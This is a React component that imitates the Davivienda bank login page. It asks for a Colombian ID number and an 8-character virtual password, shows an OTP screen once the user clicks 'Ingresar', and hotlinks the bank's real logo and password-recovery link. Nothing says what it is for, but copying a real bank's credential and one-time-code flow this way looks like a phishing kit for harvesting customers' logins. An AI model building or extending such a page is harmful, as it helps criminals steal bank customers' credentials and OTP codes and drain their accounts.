import React, { useState } from 'react';
import OTP from './otp'; // Asegúrate de ajustar la ruta si es necesario
import './styles.css';

const DaviviendaLogin = () => {
  const [showOtp, setShowOtp] = useState(false);

  const handleLoginClick = () => {
    setShowOtp(true);
  };

  return (
    <div className="flex flex-col">
      {showOtp ? (
        <OTP />
      ) : (
        <>
          <div className="flex items-center justify-center bg-[#6D6E72] flex-grow">
            <div className="w-full max-w-md bg-[#6D6E72] p-6 rounded-lg shadow-lg">
              <h1 className="text-white text-xl font-bold mb-6 text-left">Transacciones <bold>para Clientes</bold></h1>
              <div className="mb-4">
                <h2 htmlFor="documentType" className="text-white font-bold block mb-2 text-left">
                  Tipo de documento
                </h2>
                <select
                  id="documentType"
                  className="w-full p-2 bg-[#A6A6A6] text-white border border-gray-600 rounded"
                >
                  <option>Cédula de ciudadanía</option>
                  {/* Puedes agregar más opciones aquí */}
                </select>
              </div>
              <div className="flex mb-4 space-x-4">
                <div className="flex-1">
                  <h2 htmlFor="documentNumber" className="text-white font-bold block mb-2 text-center">
                    No documento
                  </h2>
                  <input
                    type="number"
                    id="documentNumber"
                    className="w-full p-2 bg-[#595959] text-white border border-gray-600 rounded"
                  />
                </div>
                <div className="flex-1">
                  <h2 htmlFor="virtualKey" className="text-white block mb-2 text-center font-bold">
                    Clave virtual
                  </h2>
                  <input
                    type="password"
                    maxLength={8}
                    id="virtualKey"
                    className="w-full p-2 bg-[#595959] text-white border border-gray-600 rounded"
                  />
                </div>
              </div>
              <div className="flex justify-center">
                <button onClick={handleLoginClick} className="custom-button">
                  Ingresar
                </button>
              </div>
              <div className="flex justify-center mt-4">
                <div className="text-center text-white text-sm">
                  <div className="mb-2">
                    <img src="/transaccional/javax.faces.resource/bullet.png.jsf?ln=img" alt="" className="inline-block mr-2" />
                    <a 
                      target="_top" 
                      id="linkRCCV" 
                      title="¿Olvidó o bloqueó su clave?" 
                      href="https://www.davivienda.com/wps/PA_AiosPersonaNatural/servlet/autoservicios?proxyRpc=true&amp;codPais=CO&amp;canal=16&amp;codRedireccion=RE001_CANAL16&amp;ccvResponsive=true" 
                      className="text-white underline hover:text-gray-300"
                    >
                      ¿Olvidó o bloqueó su clave?
                    </a>
                  </div>
                </div>
              </div>
            </div>
          </div>

          <div className="bg-red-600 py-6">
            <h1 className="block mx-auto my-4 w-full h-[28px] bg-[url('https://transacciones.davivienda.com/transaccional/javax.faces.resource/logo-davivienda.png.jsf?ln=img')] bg-no-repeat bg-center bg-contain text-transparent">
              Davivienda
            </h1>
            <div className="flex justify-around mt-4 text-white text-2xl font-bold pt-4">
              <div className="flex-1 text-center">
                PERSONAS
              </div>
              <div className="flex-1 text-center">
                EMPRESAS
              </div>
            </div>
          </div>
        </>
      )}
    </div>
  );
};

export default DaviviendaLogin;
